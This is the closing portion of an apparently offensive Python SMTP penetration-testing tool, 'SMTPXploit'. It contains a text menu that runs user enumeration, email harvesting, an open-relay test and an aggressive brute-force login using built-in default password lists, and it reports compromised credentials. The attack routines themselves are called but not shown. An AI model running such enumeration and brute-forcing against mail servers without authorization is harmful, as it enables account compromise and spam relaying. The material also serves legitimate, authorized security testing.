                    <li><strong>Regular Patching & Configuration Audits:</strong> Keep all SMTP server software, operating systems, and dependencies patched to the latest, most secure versions. Conduct frequent security configuration audits against hardening baselines.</li>
                    <li><strong>DMARC, DKIM, SPF (Comprehensive Implementation):</strong> Fully implement, monitor, and enforce DMARC, DKIM, and SPF records to prevent email spoofing, phishing, and to ensure legitimate email deliverability.</li>
                    <li><strong>Robust Logging & Alerting:</strong> Enable verbose logging on the SMTP server and configure real-time alerts for all suspicious activities (e.g., repeated failed logins, unusual command sequences, high connection rates from single IPs, non-standard commands).</li>
                    <li><strong>Cloud Environment Best Practices:</strong> If hosted in cloud, implement least-privilege for API access, secure configuration of cloud SMTP services (e.g., AWS SES policies), and continuous monitoring for cloud-specific misconfigurations.</li>
                    <li><strong>2026 Specific Mitigations:</strong> Upgrade Exim to 4.99.2+, Postfix to 3.9.1+, Sendmail to 8.17.2+. Apply Microsoft Exchange security patches. Disable PIPELINING and 8BITMIME if not required.</li>
                </ul>
            </div>
            <div class="footer">
                <p>This report contains sensitive findings. Handle with care and prioritize remediation efforts.</p>
                <p>© 2026 SMTP Aggressive Pentest Tool - Ultimate Edition</p>
            </div>
        </div>
    </body>
    </html>
    """
    
    with open(report_filename, 'w') as f:
        f.write(html_content)
    logging.info(f"Report generated: {report_filename}")
    print(f"\n[+] Comprehensive HTML report generated: {report_filename}")
    return report_filename


# ==================== TUI CLASS ====================
class SMTPXploitTUI:
    """Text User Interface for SMTPXploit"""
    
    def __init__(self):
        self.console = Console()
        self.results = {}
        self.target = ""
        self.port = 25
        self.running = False
        self.current_step = ""
        self.progress = 0
        
        # Configuration options
        self.harvest = False
        self.cert_analysis = False
        self.auth_check = False
        self.check_2026 = False
        self.nmap = False
        self.tls = False
        self.fast = False
        self.users_file = None
        self.passwords_file = None
        
        # Wordlists
        self.users = ["admin", "test", "webmaster", "postmaster", "root", "guest", "info", "support", "sales"]
        self.passwords = ["password", "123456", "admin", "test", "changeit", "welcome", "user"]
        self.expn_lists = ["staff", "admin", "support", "postmaster", "noreply", "info"]
        self.from_emails = ["attacker@example.com"]
        self.to_emails = ["external.recipient@evilexample.com"]
        
        # Results storage
        self.banner = None
        self.starttls_supported = False
        self.ehlo_extensions = []
        self.valid_users_vrfy = []
        self.valid_users_rcpt = []
        self.successful_logins = []
        self.open_relay = False
        self.cve_findings = []
        self.harvested_emails = []
        
    def show_banner(self):
        """Display the tool banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ███████╗███╗   ███╗████████╗██████╗ ██╗  ██╗██████╗ ██╗      ║
║   ██╔════╝████╗ ████║╚══██╔══╝██╔══██╗╚██╗██╔╝██╔══██╗██║      ║
║   ███████╗██╔████╔██║   ██║   ██████╔╝ ╚███╔╝ ██████╔╝██║      ║
║   ╚════██║██║╚██╔╝██║   ██║   ██╔═══╝  ██╔██╗ ██╔═══╝ ██║      ║
║   ███████║██║ ╚═╝ ██║   ██║   ██║     ██╔╝ ██╗██║     ███████╗ ║
║   ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝ ║
║                                                                  ║
║       Advanced SMTP Penetration Testing Framework                ║
║       AUTHOR: SYLHETYHACKVENGER (THE-ERROR808)                  ║
║       Version: 2026 Ultimate TUI Edition                        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
        """
        self.console.print(Align.center(banner), style="bold cyan")
    
    def show_welcome(self):
        """Show welcome message and warning"""
        warning = """
        ⚠️  WARNING: This tool performs aggressive penetration testing ⚠️
        
        ONLY USE ON SYSTEMS YOU ARE LEGALLY AUTHORIZED TO TEST
        UNAUTHORIZED USE IS ILLEGAL
        
        By continuing, you confirm you have explicit, documented permission
        """
        self.console.print(Panel(warning, style="bold red", border_style="red"))
        
        if not Confirm.ask("\nDo you have authorization to test?", default=False):
            self.console.print("[bold red]Exiting. Authorization required.[/bold red]")
            sys.exit(1)
    
    def get_target(self):
        """Get target from user input"""
        self.console.print("\n[bold cyan]Target Configuration[/bold cyan]")
        self.target = Prompt.ask("Enter target IP or hostname")
        self.port = int(Prompt.ask("Enter port", default="25"))
        
        # Load wordlists
        if Confirm.ask("Load custom wordlists?", default=False):
            self.users_file = Prompt.ask("Users file path (optional)")
            self.passwords_file = Prompt.ask("Passwords file path (optional)")
            
            if self.users_file and os.path.exists(self.users_file):
                with open(self.users_file, 'r') as f:
                    self.users = [line.strip() for line in f if line.strip()]
                self.console.print(f"[green]Loaded {len(self.users)} users[/green]")
            
            if self.passwords_file and os.path.exists(self.passwords_file):
                with open(self.passwords_file, 'r') as f:
                    self.passwords = [line.strip() for line in f if line.strip()]
                self.console.print(f"[green]Loaded {len(self.passwords)} passwords[/green]")
    
    def configure_scan(self):
        """Configure scan options"""
        self.console.print("\n[bold cyan]Scan Configuration[/bold cyan]")
        
        self.harvest = Confirm.ask("Enable Email Harvesting?", default=self.harvest)
        self.cert_analysis = Confirm.ask("Enable TLS Certificate Analysis?", default=self.cert_analysis)
        self.auth_check = Confirm.ask("Enable SPF/DKIM/DMARC Check?", default=self.auth_check)
        self.check_2026 = Confirm.ask("Enable 2026 Vulnerability Checks?", default=self.check_2026)
        self.nmap = Confirm.ask("Enable Nmap Scanning?", default=self.nmap)
        self.tls = Confirm.ask("Force TLS/STARTTLS?", default=self.tls)
        self.fast = Confirm.ask("Enable Fast Mode (Aggressive)?", default=self.fast)
        
        if self.fast:
            global current_attack_delay_min, current_attack_delay_max, current_burst_delay
            current_attack_delay_min = 0.05
            current_attack_delay_max = 0.2
            current_burst_delay = 0.01
            self.console.print("[yellow]Fast mode enabled - Attack delays set to aggressive values[/yellow]")
    
    def show_status(self):
        """Display current status"""
        status_table = Table(title="Scan Status", box=box.ROUNDED)
        status_table.add_column("Property", style="cyan")
        status_table.add_column("Value", style="white")
        
        status_table.add_row("Target", f"{self.target}:{self.port}")
        status_table.add_row("Status", "Running" if self.running else "Idle")
        status_table.add_row("Progress", f"{self.progress}%")
        status_table.add_row("Current Step", self.current_step or "Waiting...")
        
        self.console.print(status_table)
    
    def show_results(self):
        """Display scan results"""
        if not self.results:
            self.console.print("[yellow]No scan results available. Run a scan first.[/yellow]")
            return
        
        # Summary Table
        summary = Table(title="Scan Results Summary", box=box.DOUBLE)
        summary.add_column("Finding", style="bold cyan")
        summary.add_column("Status", style="white")
        
        summary.add_row("Banner", self.banner or "N/A")
        summary.add_row("STARTTLS", "✓ Supported" if self.starttls_supported else "✗ Not Supported")
        summary.add_row("Open Relay", "⚠️ VULNERABLE" if self.open_relay else "✓ Secure")
        summary.add_row("Valid Users (VRFY)", str(len(self.valid_users_vrfy)))
        summary.add_row("Valid Users (RCPT)", str(len(self.valid_users_rcpt)))
        summary.add_row("Successful Logins", str(len(self.successful_logins)))
        summary.add_row("CVEs Found", str(len(self.cve_findings)))
        if self.harvested_emails:
            summary.add_row("Emails Harvested", str(len(self.harvested_emails)))
        
        self.console.print(summary)
        
        # Show detailed results
        if self.valid_users_vrfy:
            users_table = Table(title="Valid Users (VRFY)", box=box.MINIMAL)
            users_table.add_column("Username", style="green")
            for user in self.valid_users_vrfy[:10]:
                users_table.add_row(user)
            if len(self.valid_users_vrfy) > 10:
                users_table.add_row(f"... and {len(self.valid_users_vrfy) - 10} more")
            self.console.print(users_table)
        
        if self.successful_logins:
            creds_table = Table(title="💀 Compromised Credentials", box=box.MINIMAL)
            creds_table.add_column("Username", style="red")
            creds_table.add_column("Password", style="red")
            for user, pwd in self.successful_logins:
                creds_table.add_row(user, pwd)
            self.console.print(creds_table)
        
        if self.cve_findings:
            cve_table = Table(title="CVE Findings", box=box.MINIMAL)
            cve_table.add_column("CVE ID", style="red")
            cve_table.add_column("Impact", style="yellow")
            cve_table.add_column("Description", style="white")
            for cve in self.cve_findings[:5]:
                cve_table.add_row(
                    cve.get('cve_id', 'N/A'),
                    cve.get('impact', 'N/A'),
                    cve.get('description', '')[:50] + "..."
                )
            self.console.print(cve_table)
    
    def run_scan(self):
        """Run the full scan with progress display"""
        if not self.target:
            self.console.print("[red]No target configured. Please set target first.[/red]")
            return
        
        self.running = True
        self.progress = 0
        self.current_step = "Initializing..."
        
        # Run the scan with progress
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Scanning...", total=100)
            
            try:
                # Step 1: Banner Grabbing
                self.current_step = "Banner Grabbing"
                progress.update(task, description="[cyan]Step 1: Banner Grabbing", advance=5)
                self.banner = banner_grabbing(self.target, self.port)
                
                # Step 2: STARTTLS Check
                self.current_step = "STARTTLS Check"
                progress.update(task, description="[cyan]Step 2: STARTTLS Check", advance=5)
                self.starttls_supported, self.ehlo_extensions = check_starttls(self.target, self.port)
                
                # Step 3: Email Harvesting
                if self.harvest:
                    self.current_step = "Email Harvesting"
                    progress.update(task, description="[cyan]Step 3: Email Harvesting", advance=10)
                    harvester = EmailHarvester(self.target)
                    self.harvested_emails = harvester.full_harvest()
                    if self.harvested_emails:
                        self.users = list(set(self.users + self.harvested_emails))
                
                # Step 4: Certificate Analysis
                if self.cert_analysis and CRYPTO_AVAILABLE:
                    self.current_step = "Certificate Analysis"
                    progress.update(task, description="[cyan]Step 4: TLS Certificate Analysis", advance=10)
                    cert_results = analyze_tls_certificate(self.target, self.port if self.port in [465, 587] else 465)
                    self.results['certificate_analysis'] = cert_results
                
                # Step 5: SPF/DKIM/DMARC
                if self.auth_check and NETWORK_EXTRAS_AVAILABLE:
                    self.current_step = "Email Authentication Check"
                    progress.update(task, description="[cyan]Step 5: SPF/DKIM/DMARC Check", advance=10)
                    auth_results = check_dkim_spf_dmarc(self.target)
                    self.results['email_auth'] = auth_results
                
                # Step 6: VRFY Enumeration
                self.current_step = "VRFY Enumeration"
                progress.update(task, description="[cyan]Step 6: VRFY Enumeration", advance=10)
                self.valid_users_vrfy = user_enumeration_vrfy(self.target, self.users, self.port)
                
                # Step 7: RCPT Enumeration
                self.current_step = "RCPT Enumeration"
                progress.update(task, description="[cyan]Step 7: RCPT Enumeration", advance=10)
                self.valid_users_rcpt, _ = user_enumeration_rcpt(
                    self.target, self.users, [self.target], self.from_emails[0], self.port
                )
                
                # Step 8: Open Relay Check
                self.current_step = "Open Relay Check"
                progress.update(task, description="[cyan]Step 8: Open Relay Check", advance=10)
                self.open_relay = check_open_relay_aggressive(
                    self.target, self.from_emails, self.to_emails, self.port
                )
                
                # Step 9: Brute Force
                self.current_step = "Brute Force"
                progress.update(task, description="[cyan]Step 9: Brute Force Attack", advance=10)
                self.successful_logins, _ = brute_force_aggressive(
                    self.target, self.port, self.users, self.passwords, self.tls
                )
                
                # Step 10: 2026 Vulnerabilities
                if self.check_2026:
                    self.current_step = "2026 Vulnerability Checks"
                    progress.update(task, description="[cyan]Step 10: 2026 Vulnerability Checks", advance=10)
                    vulns_2026 = check_2026_vulnerabilities(self.target, self.port)
                    self.results['vulns_2026'] = vulns_2026
                
                # Step 11: CVE Detection
                self.current_step = "CVE Detection"
                progress.update(task, description="[cyan]Step 11: CVE Detection", advance=10)
                self.cve_findings = _check_known_cves(
                    self.banner, self.ehlo_extensions, self.open_relay,
                    [], self.results.get('vulns_2026')
                )
                
                # Step 12: Nmap Scan
                if self.nmap:
                    self.current_step = "Nmap Scan"
                    progress.update(task, description="[cyan]Step 12: Nmap Scanning", advance=10)
                    self.results['nmap_output'] = nmap_scan(self.target, self.port)
                
                # Complete
                self.progress = 100
                self.running = False
                progress.update(task, advance=100)
                self.current_step = "Scan Complete!"
                
                # Store results
                self.results.update({
                    'target': self.target,
                    'port': self.port,
                    'banner': self.banner,
                    'starttls_supported': self.starttls_supported,
                    'ehlo_extensions': self.ehlo_extensions,
                    'valid_users_vrfy': self.valid_users_vrfy,
                    'valid_users_rcpt': self.valid_users_rcpt,
                    'successful_logins': self.successful_logins,
                    'open_relay': self.open_relay,
                    'cve_findings': self.cve_findings,
                    'harvested_emails': self.harvested_emails
                })
                
                # Generate report
                report_file = generate_report(self.results, self.target)
                self.console.print(f"\n[bold green]✓ Scan complete! Report saved: {report_file}[/bold green]")
                
            except KeyboardInterrupt:
                self.running = False
                self.console.print("\n[bold red]Scan interrupted by user[/bold red]")
            except Exception as e:
                self.running = False
                self.console.print(f"\n[bold red]Error during scan: {str(e)}[/bold red]")
                logging.error(f"Scan error: {e}")
    
    def show_menu(self):
        """Display the main menu"""
        if not RICH_AVAILABLE:
            print("Rich library not available. Install with: pip install rich")
            self.run_cli_mode()
            return
        
        while True:
            self.console.clear()
            self.show_banner()
            
            menu = Table(title="Main Menu", box=box.ROUNDED, show_header=False)
            menu.add_column("Option", style="bold cyan", width=6)
            menu.add_column("Description", style="white")
            
            menu.add_row("1", "Configure Target")
            menu.add_row("2", "Configure Scan Options")
            menu.add_row("3", "Start Scan")
            menu.add_row("4", "View Results")
            menu.add_row("5", "Generate Report")
            menu.add_row("6", "Show Status")
            menu.add_row("7", "Export Results (JSON)")
            menu.add_row("q", "Quit")
            
            self.console.print(menu)
            
            if self.target:
                self.console.print(f"\n[green]Current Target: {self.target}:{self.port}[/green]")
                config_status = []
                if self.harvest: config_status.append("Harvest")
                if self.cert_analysis: config_status.append("Cert")
                if self.auth_check: config_status.append("Auth")
                if self.check_2026: config_status.append("2026")
                if config_status:
                    self.console.print(f"[yellow]Enabled: {', '.join(config_status)}[/yellow]")
            
            choice = Prompt.ask("\nSelect option", choices=["1", "2", "3", "4", "5", "6", "7", "q"])
            
            if choice == "1":
                self.get_target()
            elif choice == "2":
                self.configure_scan()
            elif choice == "3":
                self.run_scan()
                input("\nPress Enter to continue...")
            elif choice == "4":
                self.show_results()
                input("\nPress Enter to continue...")
            elif choice == "5":
                if self.results:
                    report_file = generate_report(self.results, self.target)
                    self.console.print(f"[green]Report generated: {report_file}[/green]")
                else:
                    self.console.print("[yellow]No results to generate report.[/yellow]")
                input("\nPress Enter to continue...")
            elif choice == "6":
                self.show_status()
                input("\nPress Enter to continue...")
            elif choice == "7":
                if self.results:
                    json_file = f"smtp_results_{self.target}_{int(time.time())}.json"
                    with open(json_file, 'w') as f:
                        json.dump(self.results, f, indent=2, default=str)
                    self.console.print(f"[green]Results exported to: {json_file}[/green]")
                else:
                    self.console.print("[yellow]No results to export.[/yellow]")
                input("\nPress Enter to continue...")
            elif choice == "q":
                self.console.print("[bold red]Exiting...[/bold red]")
                break
    
    def run_cli_mode(self):
        """Fallback CLI mode when Rich is not available"""
        print("\n[!] Rich library not available. Running in CLI mode.")
        print("[!] Install rich for a better experience: pip install rich\n")
        
        # Parse arguments directly
        import argparse
        parser = argparse.ArgumentParser(description="SMTP Aggressive Pentest Tool - 2026 Ultimate Edition")
        parser.add_argument("target", help="Target SMTP server IP or hostname")
        parser.add_argument("--port", type=int, default=25, help="SMTP port")
        parser.add_argument("--harvest", action="store_true", help="Enable email harvesting")
        parser.add_argument("--cert_analysis", action="store_true", help="Enable TLS certificate analysis")
        parser.add_argument("--auth_check", action="store_true", help="Enable SPF/DKIM/DMARC check")
        parser.add_argument("--check_2026", action="store_true", help="Enable 2026 vulnerability checks")
        parser.add_argument("--nmap", action="store_true", help="Enable Nmap scanning")
        parser.add_argument("--tls", action="store_true", help="Force TLS/STARTTLS")
        parser.add_argument("--fast", action="store_true", help="Fast mode")
        args = parser.parse_args()
        
        # Set config from args
        self.target = args.target
        self.port = args.port
        self.harvest = args.harvest
        self.cert_analysis = args.cert_analysis
        self.auth_check = args.auth_check
        self.check_2026 = args.check_2026
        self.nmap = args.nmap
        self.tls = args.tls
        self.fast = args.fast
        
        print(f"\n[*] Target: {self.target}:{self.port}")
        print("[*] Running scan...\n")
        self.run_scan()


# ==================== MAIN ENTRY POINT ====================
def main():
    """Main entry point for the application"""
    # Check for Rich availability
    if not RICH_AVAILABLE:
        print("[-] rich library not found. Installing...")
        print("[*] Run: pip install rich")
        print("[*] Falling back to CLI mode...")
    
    # Check for required dependencies
    missing_deps = []
    if not RICH_AVAILABLE:
        missing_deps.append("rich")
    if not ML_AVAILABLE:
        print("[!] scikit-learn not found - AI anomaly detection disabled")
    if not PLOTTING_AVAILABLE:
        print("[!] matplotlib not found - graph generation disabled")
    
    if missing_deps:
        print(f"[!] Missing dependencies: {', '.join(missing_deps)}")
        print("[*] Install with: pip install " + " ".join(missing_deps))
    
    # Create and run TUI
    tui = SMTPXploitTUI()
    
    # Show welcome and warning
    if RICH_AVAILABLE:
        tui.show_welcome()
        tui.show_menu()
    else:
        print("!!! WARNING: This tool performs aggressive penetration testing. !!!")
        print("!!! ONLY USE ON SYSTEMS YOU ARE LEGALLY AUTHORIZED TO TEST. !!!")
        response = input("Do you have authorization? (y/n): ")
        if response.lower() != 'y':
            print("Exiting. Authorization required.")
            sys.exit(1)
        tui.run_cli_mode()


if __name__ == '__main__':
    main()
